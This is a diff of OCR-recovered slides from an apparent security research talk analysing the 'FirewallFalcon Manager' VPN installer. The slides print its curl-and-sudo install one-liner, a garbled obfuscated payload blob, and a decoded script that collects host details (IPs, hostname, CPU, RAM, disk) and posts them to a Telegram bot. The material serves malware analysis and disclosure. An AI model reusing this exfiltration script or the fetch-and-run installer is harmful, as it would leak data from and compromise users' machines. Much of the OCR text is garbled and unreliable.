-Ver] = strings. Index(@x21);
 if (Wert <@) {
-os .Gpen’ i lel @=xlet);
-+ flare
 ```
 
 ## Slide 102
 
 **THIS SHOULDN’T BE THERE**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-THIS SHOULDN'T BE THERE
-+ flare
-```
-
 ## Slide 103
 
 ### **FOUR INTERESTING ELEMENTS IN THE TOOL**
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-FOUR INTERESTING ELEMENTS IN THE TOOL
-+ flare
-77 \N
-AWD FJ,
-```
 
 ## Slide 104
 
 **REMEMBER THIS ONE…**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 REMEMBER THIS ONE...
-+ flare
 Firewallfalcon Manager ¢
 Free installation, supports all types of CPU.
-OObBBOS
 curl -L -o install.sh
 "https://raw.githubusercontent.com/firewallfalcons/FirewallFalcon-
 Manager/refs/heads/main/install.sh” && chmod +x install.sh &&
 sudo ./install.sh && rm install.sh
 = d 7 91 a 1 © 2608 edited 2:15PM
-SY 9 4 comments
 ```
 
 ## Slide 105
@@ -2377,7 +2141,8 @@ SY 9 4 comments
 
 ## **JUNE-NOVEMBER 2025**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 GIT CLONE --MIRROR C)
@@ -2413,7 +2178,8 @@ JUNE-NOVEMBER 2025
 
 **LAYER1 OF 64INSTALL_V3.SH**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 LAYER1 OF 64INSTALL_V3.SH
@@ -2437,7 +2203,8 @@ apt-get update &>/dev/null && apt-get install -y bc &/dev/null || yum install -y
 
 **LAYER1 OF 64INSTALL_V3.SH**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 LAYER1 OF 64INSTALL_V3.SH
@@ -2461,40 +2228,20 @@ install -m 755 "$t" "$p" || { rm -f "$t"; e "Installation failed. Check permissi
 
 **LAYER1 OF 64INSTALL_V3.SH**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 31/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 LAYER1 OF 64INSTALL_V3.SH
 # —-- PAYLOAD START --- DO NOT EDIT BELOW THIS LINE ——-
-et E LF stxsolsoHNULNULNULNULNULNULNULNULNULETXNUL>> NULSOHNULNULNULNULOCNULNULNULNULNULNUL(INULNULNULNULNULNULNUL GSSTXNULNULNULNULNULNULNULNULNUL (GNUL G NUL
-NUL(QNULGSNULFSNULACKNULNULNULEOTNULNULNUL(QNULNULNULNULNULNULNUL(QNULNULNULNULNULNULNUL(GNULNULNULNULNULNULNUL (@STSNULNULNULNULNULNUL 6) TXNULNULNULNULNULNULBSNULNULNULNULNULNULNULETYNULNULNULEGTNULNULNULCANETXNULNULNULNULNULNULCANE TXNULNULNULNULNULNULCAN
-NULNULBELNULEJNULNULNULDLENULNULNULG) (7 © ACKNULNULACKNUL@JNULNULNULDLENULNULNULG) 6 & ACKNULNULENQNULACKSOHNULNULDLENULNULNULOCA i
-NULNULEOTNULDCISOHNULNULDLENULNULNUL © &) EJACKNULNULETXNULESCSOHNULNULOLENULNULNUL SUB | NULNULSTXNUL,SOHNULNULNULNULNULNULOLENULNULNULNULNULNULBSNULNULNULNULNULNULNUL (7 0C3NULNULNULNULNULNULCAN=NULNULNULNULNULNULBSNULNULNULNULNULNULNUL (C3 1ULBS(GINULNULNULNULNUL
-NULNULNULNULNULNULNULNULNULNULNUL [) NULNULNULNULNULNULBELNULNULNUL NULNULNULNULNULNULNULNULNULNULNUL “7 NULNULNULNULNULNULBELNULNULNUL Fe NULNULNULNULNULNULNULNULNULNULNUL X ? NULNULNULNULNULNULBELNULNULNUL
-NULNULNULNULNULNULNULNULNULNULNULG) “7 NULNULNULN JULNULNULNULNULNULNULNULNULNULNULE "7 NULNULNULNULNULNULBELNULNULNULDLENULNULNULNULNULNULNULNULNULNULNUL @ ° NULNULNULNULNULNULBELNULNULNULOCTNULNULNULNULNULNULNULNULNULNULNUL GY “7 NULNULNULN :2NULNU
-wm BOGO f OOses@ hymn G2 GGG f OOsnsHh ram" GOO f O@sesHh
-nan Goe29OG f OGsnsG him GsxGOG f GGsnsG hsm. GGGOG f GGsnsG hoemnuncG GOGO f OGsxs6) hocmanun GOOG f OGsnsG hocanunn YOOGO f OO snsG hocamununn GOOG f OGsnsG hoc GOOG f OOsnst
-ocacansTanur Gocaassi®ena
-esr § OsoiGacsorensrousGanGonsran GGURG | OOssOUHOGHO} OUGHOEGHOEOOOmnuus GenadensrouisGOHOHOru@eresmnasGeoreG) E GaGunGcmsrans@ Eso} JaaGewsrousQanblersmusOOO@ } OGHCOHOEGH
-Retasnou @ocasss Gena Jcansraus@G@HOHO
-<Erasnours@ U@ Qocasss Ging , canst. G Oso Qenc%scansnoursGenorscarsoun GSO GG OOHGE Onasonunn Gm@nrsonunnG } Guus ' COOGO ] OGses@ UHOGHG } OUGHOEGHOE GO Grams Gena crasrnu G YsorGenoGeresrours@enoben
-Usmsnout @ocaessi®jeno LevesrusiQOHOHO
-_Snisns@ UG Gocrass Gene Qeresrauisi@ GH OHOMKE snsrais eorouen F OHOEOSGess E OHGHOmersnsnausGeowee 1 OG OHOEOOHEHOEOsHOmOsG } Oras , OOOOO ] GOs OUHOGHOO Gon OOOGOO dH Geers ( wu
-COOOOGmuM HOO * COOGGinan Oruninini HOGG POGOHOOOEEOCHOGhGECHOGGGEEHEO  COGHEOEOOGHEECOEGGEOGS | COGOOOCOOGECHOOMGOCHOEGHEE ( COGHGECHOOSOGOHOE
-seine HOGHONMINNLG e OGEHOEOGOGHOGEF OGCHOGOEOCHOGOGOCHOGG  COOCGEOGCHOOGOEOML [HOOCOECHEOGOOGEOOOOEH cCOHO<aGGOOOOOGHOOHOSe” Mim HOT inn
-OOOO rua H OaeGocisrau HOWE OOO GsOarawocisnan OG t —HOere Locsin HOOGOOOGHO jrmnnGGOOGHIG } FHOaaGoesanG German
-nanan Gene Gocisraun GG OOOG Geman H GanoG) mun OOOG OO Osman} Genel munc OOOO Osanna HOenal sro GOO qOOGGsmmumnnH Gare saan OOO ] EOGSsrmmununnHGeral Suunn HOOOPOGSE
-HOGssNHOOEOOGHOECHO} Ouiu
-sr HOOHOEG
-sro HOGOOOOEOt FHOAG
-+ flare
 ```
 
 ## Slide 112
 
 **ANALYZING 64INSTALL.SHC (LAYER3)**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 ANALYZING 64INSTALL.SHC (LAYER3)
@@ -2505,22 +2252,16 @@ CHAT_ID=" "
 IPV4=$(curl -s -4 icanhazip.com)
 IPV6=$(curl -s -6 icanhazip.com --max-time 5)
 HOSTNAME=$ (hostname)
-0S=$(uname -a)
 CPU=$(1lscpu | grep ‘Model name' | awk -F: ‘{print $2}' | xargs)
 CORES=$(nproc)
 RAM=$(free -g | awk '/Mem:/ {print $2 " GB"}')
 DISK=$(df -BG --output=size,avail / | awk 'NR==2 {print $1 " total, " $2 " free"}'
 MESSAGE=""«!!! #2 New SSH Manager Install !!!x
-*Hostname:* \* $HOSTNAME\~
-*IPv4:% \*$IPV4\~
 if [[ -n "$IPV6" && "$IPV6" != "$IPV4" ]]; then
-MESSAGE+="*IPv6:* \* $IPV6\~
 fi
 MESSAGE+="*CPU:* $CPU
 *Cores:* $CORES
-*RAM:* $RAM
 *Disk:* $DISK
-*0S:* \*$0S\*"
 curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
 -d chat_id="$CHAT_ID" \
 -d parse_mode="Markdown" \
@@ -2532,7 +2273,8 @@ curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
 
 **ANALYZING 64INSTALL.SHC (LAYER3)**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 ANALYZING 64INSTALL.SHC (LAYER3) C)
@@ -2546,27 +2288,26 @@ curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
 
 **ANALYZING 64INSTALL.SHC (LAYER3)**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 ANALYZING 64INSTALL.SHC (LAYER3)
 *Hostname:* \* $HOSTNAME\ *
-*IPv4:* \*$IPV4\~
 if [[ -n "$IPV6" && "$IPV6" != "$IPV4" |]; then
-MESSAGE+="*IPv6:* \* $IPV6\~
 fi
 MESSAGE+="*CPU:* $CPU
 *Cores:* $CORES
 *RAM:* $RAM
 *Disk:* $DISK
-*0S:* \*$0S\*"
 ```
 
 ## Slide 115
 
 **IS THE TELEGRAM BOT STILL ACTIVE?**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 IS THE TELEGRAM BOT STILL ACTIVE?
@@ -2592,7 +2333,8 @@ ubuntu@F lareResearch:~/Research/March-26/FirewallFalcon$ curl -s "https://api.t
 
 **ANALYZING 64INSTALL.SHC (LAYER3)**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 81/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 ANALYZING 64INSTALL.SHC (LAYER3) C)
@@ -2624,20 +2366,12 @@ Telegram bot exfiltrates data about the host
 
 **FOUR INTERESTING ELEMENTS IN THE TOOL**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-FOUR INTERESTING ELEMENTS IN THE TOOL
-+ flare
-77 \N
-AWD FJ,
-```
-
 ## Slide 120
 
 **REMEMBER THIS ONE…**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 REMEMBER THIS ONE... C)
@@ -2646,19 +2380,18 @@ Your connection details:
 — Public Key:
 — Forwarding To: V2Ray (port 8787)
 — Action Required: Ensure a V2Ray service (vless/vmess/trojan) listens on port 8787 (no TLS)
-+ flare
 ```
 
 ## Slide 121
 
 **FOUND THIS IN THE CODE**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 FOUND THIS IN THE CODE
 71 # --- ZiVPN Variables -—--
-72 ZIVPN_DIR="/etc/zivpn"
 73 ZIVPN_BIN="/usr/local/bin/zivpn"
 74 ZIVPN_SERVICE_FILE="/etc/systemd/system/zivpn.service"
 75 ZIVPN_CONFIG_FILE="$ZIVPN_DIR/config. json"
@@ -2676,7 +2409,6 @@ FOUND THIS IN THE CODE
 87 BANNER_CACHE_UP_TIME=""
 88 BANNER_CACHE_RAM_USAGE="""'
 89 BANNER_CACHE_CPU_LOAD=""
-+ flare
 ```
 
 ## Slide 122
@@ -2687,19 +2419,16 @@ FOUND THIS IN THE CODE
 
 **https://manager.firewallfalcon.qzz.io/ -H "Authorization: Token <<REDACTED>>"**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 78/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 ANALYZING FIREWALLFALCON’S DNSTT
 "created": "2026-@7-14T@1:26:44.347877Z",
 "domain": "manager.firewallfalcon.qzz.io",
-'
 -manager.firewallfalcon.qzz.io.",
 "name":
 "records":
-1,
-StL": 3600;
-"type" a AS ;
 "touched": "2@26-@07-14T@1:26:44.360210Z"
 "created": "2026-07-14T00:11:56.900720Z",
 "domain": "“manager.firewallfalcon.qzz.io",
@@ -2721,23 +2450,19 @@ https://manager.firewallfalcon.qzz.io/
 
 **ANALYZING FIREWALLFALCON’S DNSTT**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-JOS LITE
 CUMULATIVE DNS RECORDS OVER TIME
 2025
 RECORDS |
 2900 -
-2400 ~
-1900 -
 1400 -
 980 -
 400 -
 -100
-=a
 2026
-— (4
 MAR-25
 T
 APR-25
@@ -2773,20 +2498,16 @@ ANALYZING FIREWALLFALCON’S DNSTT
 
 ### **ANALYZING THE DEPLOYED SERVERS**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 ANALYZING THE DEPLOYED SERVERS
-'é
 Compromised machine
-y
 VPW Reseller
-Falcon agent vps-23tizzl1 tun-1h6Fl ns-1h6Fal
 Installs Firewall Assigned node ID Create atunnel Create a DVS ¢ \)
-| ——\
 Sell cheap VP
 To customers
-+ flare
 ```
 
 ## Slide 127
@@ -2822,15 +2543,6 @@ Wide geo-location, vendors spread even for the same VPN reseller
 ## Slide 131
 
 ### **FOUR INTERESTING ELEMENTS IN THE TOOL**
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-FOUR INTERESTING ELEMENTS IN THE TOOL
-+ flare
-77 \N
-AWD FJ,
-```
 
 ## Slide 132
 
@@ -2883,17 +2595,6 @@ ENCRYPTED
 
 #### **ENCRYPTED**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-THE INFRASTRUCTURE =)
-=
-lo =)
-ENCRYPTED
-ENCRYPTED
-Eel | COTE
-```
-
 ## Slide 139
 
 THE INFRASTRUCTURE
@@ -2903,17 +2604,6 @@ VPN TUNNEL CAN TERMINATE HERE
 ENCRYPTED
 
 ENCRYPTED
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-THE INFRASTRUCTURE
-ENCRYPTED Freer
-E =
-ENCRYPTED
-ENCRYPTED
-Eel | Eee
-```
 
 ## Slide 140
 
@@ -2927,18 +2617,6 @@ Eel | Eee
 
 - Streaming
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-WHO ARE THE FIREWALL FALCON USERS
-¢ Commercial SSH/WebSocket VPN subscription
-¢ Cheap VPS
-¢ Free internet
-¢ Streaming
-ee seees
-+ flare
-```
-
 ## Slide 141
 
 ### **WHO ARE THE FIREWALL FALCON USERS**
@@ -2951,16 +2629,15 @@ ee seees
 
 - Streaming
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 WHO ARE THE FIREWALL FALCON USERS
 ¢ Commercial SSH/WebSocket VPN subscription
 ¢ Cheap VPS
 e Free internet
-4,578 posts 77.1K followers za
 ¢ Streaming
-ee se
 +flare
 Game Publisher
 ```
